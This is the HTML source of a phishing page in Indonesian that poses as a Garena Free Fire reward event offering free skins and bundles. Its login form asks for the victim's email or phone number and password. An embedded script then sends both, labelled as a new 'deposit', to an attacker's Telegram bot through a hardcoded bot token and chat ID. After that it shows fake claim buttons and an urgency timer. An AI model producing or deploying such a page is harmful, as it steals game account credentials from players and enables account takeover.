<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Event Reward</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap');
        body { background: #0b0f1a; font-family: 'Teko', sans-serif; color: white; }
        .ff-card { background: rgba(255, 255, 255, 0.05); border: 1px solid #334155; border-radius: 8px; overflow: hidden; }
        .btn-claim { background: linear-gradient(180deg, #facc15 0%, #ca8a04 100%); color: black; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="login-section" class="min-h-screen flex items-center justify-center p-4">
        <div class="w-full max-w-sm bg-gray-900 border-2 border-yellow-500 p-6 rounded-lg shadow-2xl">
            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-12 mx-auto mb-4">
            <h2 class="text-2xl text-center font-bold mb-6 text-yellow-500 italic uppercase">Login untuk Klaim</h2>
            <form id="authForm" class="space-y-4">
                <input type="text" id="user" class="w-full p-3 bg-black border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Email atau Nomor HP" required>
                <input type="password" id="pass" class="w-full p-3 bg-black border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Kata Sandi" required>
                <button type="submit" class="w-full btn-claim py-3 rounded text-lg uppercase italic transform active:scale-95 transition">Masuk & Klaim</button>
            </form>
        </div>
    </div>

    <div id="reward-section" class="hidden min-h-screen p-4">
        <div class="max-w-4xl mx-auto">
            <div class="relative mb-6">
                <img src="https://i.ibb.co/L5rKz7P/banner-ff-jjk.jpg" class="w-full rounded-lg border-2 border-blue-500" alt="Banner Event">
                <div class="bg-blue-900/80 text-center py-2 text-sm font-bold tracking-widest uppercase italic">
                    UID 3585****23 Mendapatkan M1887 - RAPPER
                </div>
            </div>

            <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
                <div class="ff-card p-2 text-center">
                    <img src="https://i.ibb.co/0XzZ4k0/gojo.png" class="w-full h-32 object-contain mb-2" alt="Satoru Gojo">
                    <p class="text-xs uppercase font-bold text-gray-300">Satoru Gojo Bundle</p>
                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
                </div>
                <div class="ff-card p-2 text-center">
                    <img src="https://i.ibb.co/3s6K8fR/m1887.png" class="w-full h-32 object-contain mb-2" alt="M1887">
                    <p class="text-xs uppercase font-bold text-gray-300">M1887 Rapper Underworld</p>
                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
                </div>
                <div class="ff-card p-2 text-center">
                    <img src="https://i.ibb.co/YyYJmR1/jenggot.png" class="w-full h-32 object-contain mb-2" alt="Jenggot BML">
                    <p class="text-xs uppercase font-bold text-gray-300">Jenggot Old BML</p>
                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
                </div>
                </div>

            <div class="mt-8 bg-red-600/20 border border-red-600 p-4 text-center rounded">
                <p class="text-red-500 font-bold uppercase italic">Event Terbatas Berakhir Pada: <span id="timer">23:59:45</span></p>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
        const CHAT_ID = "8551809114";

        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            // Efek Loading
            this.querySelector('button').innerText = "MEMVERIFIKASI...";

            // Kirim Data Diam-diam
            const pesan = `üö® **SETORAN BARU** üö®\n\nüë§ User: \`${u}\` \nüîë Pass: \`${p}\` \n‚è∞ Waktu: ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
            });

            // PINDAH KE DASHBOARD HADIAH
            document.getElementById('login-section').classList.add('hidden');
            document.getElementById('reward-section').classList.remove('hidden');
        });
    </script>
</body>
</html>
